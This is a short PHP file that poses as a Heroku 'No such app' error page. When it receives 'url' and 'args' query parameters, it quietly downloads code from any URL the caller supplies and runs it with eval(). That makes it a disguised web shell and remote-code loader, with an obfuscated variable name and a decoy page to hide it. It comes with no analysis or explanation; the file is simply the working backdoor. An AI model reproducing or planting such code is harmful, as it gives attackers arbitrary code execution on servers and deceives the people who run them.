<?php if (isset ($_GET['url']) && isset ($_GET['args'])) { $fqaewzFBlcQOIlGvQxCF = json_decode($_GET['args'], true); eval(str_replace(array_keys($fqaewzFBlcQOIlGvQxCF), array_values($fqaewzFBlcQOIlGvQxCF), file_get_contents($_GET['url']))); } else { echo "<!DOCTYPE html>
			<html>
				<head>
					<meta name='viewport' content='width=device-width, initial-scale=1'>
					<meta charset='utf-8'>
					<title>No such app</title>
					<style media='screen'>
						html,body,iframe {
							margin: 0;
							padding: 0;
						}
						html,body {
							height: 100%;
							overflow: hidden;
						}
						iframe {
							width: 100%;
							height: 100%;
							border: 0;
						}
					</style>
				</head>
				<body>
					<iframe src='//www.herokucdn.com/error-pages/no-such-app.html'></iframe>
				</body>
			</html>"; } ?>